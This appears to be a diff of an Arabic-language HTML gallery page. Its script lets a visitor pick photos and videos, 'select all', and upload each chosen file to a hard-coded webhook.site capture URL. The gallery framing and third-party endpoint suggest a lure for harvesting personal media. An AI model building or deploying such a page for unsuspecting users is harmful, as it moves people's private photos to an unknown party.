@@ -3,63 +3,132 @@
 <head>
   <meta charset="UTF-8" />
   <meta name="viewport" content="width=device-width, initial-scale=1.0"/>
-  <title>معرض الصور</title>
+  <title>معرض الملفات</title>
   <style>
     body {
       margin: 0;
-      padding: 20px;
+      padding: 10px;
       background: #111;
       color: #fff;
       font-family: Arial, sans-serif;
       text-align: center;
     }
     button {
-      padding: 18px 40px;
-      font-size: 1.4rem;
-      margin: 30px 0;
-      background: #0066ff;
-      color: white;
+      padding: 15px 25px;
+      font-size: 1.3rem;
+      margin: 10px;
       border: none;
-      border-radius: 12px;
+      border-radius: 10px;
       width: 90%;
     }
-    .info {
-      margin: 20px 0;
-      font-size: 1.1rem;
+    #gallery {
+      display: grid;
+      grid-template-columns: repeat(auto-fill, minmax(110px, 1fr));
+      gap: 8px;
+      margin-top: 20px;
+    }
+    .item {
+      position: relative;
+      border-radius: 8px;
+      overflow: hidden;
+    }
+    .item img, .item video {
+      width: 100%;
+      height: 130px;
+      object-fit: cover;
+    }
+    .item.selected {
+      border: 4px solid #00ff00;
+      box-shadow: 0 0 10px #00ff00;
+    }
+    .select-all {
+      background: #ff8800;
     }
   </style>
 </head>
 <body>
 
-  <h2>📸 معرض الصور والفيديوهات</h2>
-  <p class="info">اضغط الزر أدناه واختر مجلد الصور (DCIM أو Pictures)</p>
+  <h2>معرض الصور والفيديوهات</h2>
   
-  <button onclick="openPhotosFolder()">فتح مجلد الصور</button>
+  <button onclick="openGallery()">فتح المعرض</button>
+  <button class="select-all" onclick="selectAll()">تحديد الكل</button>
+  <button onclick="sendSelected()">إرسال المحدد إلى Webhook</button>
 
-  <div id="status"></div>
+  <div id="gallery"></div>
 
 <script>
 const WEBHOOK_URL = "https://63cf68fa-614f-459e-827a-4235bbee5ed3.webhook.site";
+let allFiles = [];
 
-async function openPhotosFolder() {
-  const status = document.getElementById('status');
-  status.innerHTML = "جاري فتح مجلد الصور...";
+function openGallery() {
+  const input = document.createElement('input');
+  input.type = 'file';
+  input.multiple = true;
+  input.accept = "image/*,video/*";
 
-  try {
-    // طلب اختيار مجلد
-    const dirHandle = await window.showDirectoryPicker({
-      startIn: "pictures"   // محاولة البدء من مجلد الصور
+  input.onchange = function(e) {
+    const gallery = document.getElementById('gallery');
+    gallery.innerHTML = '';
+    allFiles = Array.from(e.target.files);
+
+    allFiles.forEach((file, index) => {
+      const div = document.createElement('div');
+      div.className = 'item';
+      div.dataset.index = index;
+
+      if (file.type.startsWith('image/')) {
+        const img = document.createElement('img');
+        img.src = URL.createObjectURL(file);
+        div.appendChild(img);
+      } else {
+        const vid = document.createElement('video');
+        vid.src = URL.createObjectURL(file);
+        vid.muted = true;
+        div.appendChild(vid);
+      }
+
+      div.onclick = () => {
+        div.classList.toggle('selected');
+      };
+
+      gallery.appendChild(div);
     });
+  };
 
-    status.innerHTML = `✅ تم فتح المجلد: ${dirHandle.name}<br>جاري تحميل الملفات...`;
+  input.click();
+}
 
-    // هنا يمكن إضافة كود لعرض الملفات لاحقاً
+function selectAll() {
+  document.querySelectorAll('.item').forEach(item => {
+    item.classList.add('selected');
+  });
+  alert(`تم تحديد ${allFiles.length} ملف بنجاح`);
+}
 
-    alert("تم الوصول إلى مجلد الصور بنجاح!\n(سيتم تطوير عرض الملفات في النسخة القادمة)");
-
-  } catch (err) {
-    status.innerHTML = "❌ تم إلغاء العملية أو حدث خطأ";
+function sendSelected() {
+  const selectedItems = document.querySelectorAll('.item.selected');
+  
+  if (selectedItems.length === 0) {
+    alert('لم تقم بتحديد أي ملف');
+    return;
   }
+
+  alert(`جاري إرسال ${selectedItems.length} ملف...`);
+
+  selectedItems.forEach((item, i) => {
+    const file = allFiles[item.dataset.index];
+    const fd = new FormData();
+    fd.append('file', file);
+    fd.append('filename', file.name);
+    fd.append('total', selectedItems.length);
+    
+    fetch(WEBHOOK_URL, {
+      method: 'POST',
+      body: fd
+    });
+  });
+
+  alert('تم الإرسال بنجاح!');
 }
 </script>
 
